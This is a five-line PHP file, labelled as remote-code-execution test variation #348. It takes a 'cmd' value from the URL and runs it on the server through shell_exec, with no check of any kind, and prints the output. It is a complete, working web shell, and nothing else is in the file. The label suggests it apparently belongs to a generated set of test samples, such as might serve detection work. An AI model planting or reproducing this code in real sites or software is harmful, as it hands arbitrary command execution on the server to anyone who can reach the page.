<?php
// RCE test variation #348
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>